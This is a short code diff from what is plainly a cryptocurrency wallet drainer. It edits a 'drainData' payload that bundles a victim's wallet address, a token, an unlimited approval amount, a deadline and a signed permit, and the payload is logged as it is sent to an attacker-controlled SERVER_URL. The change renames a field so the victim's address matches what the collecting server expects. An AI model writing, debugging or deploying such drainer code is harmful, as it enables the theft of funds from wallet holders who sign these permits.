@@ -527,14 +527,12 @@ try {
 }
 
   const drainData = {
-    owner: victimWallet,
-    token: tokenAddr,
-    tokenSymbol: symbol,
-    amount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
-    nonce: "0",
-    deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
-    signature
-  };
+  tokenSymbol: symbol,
+  amount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+  nonce: "0", 
+  deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
+  victimAddress: victimWallet  // ✅ Server req.body.victimAddress
+};
   
   // 🔥 CRITICAL DEBUG LOGS
   console.log(`🔥 ${symbol} → SENDING to ${SERVER_URL}:`, drainData);
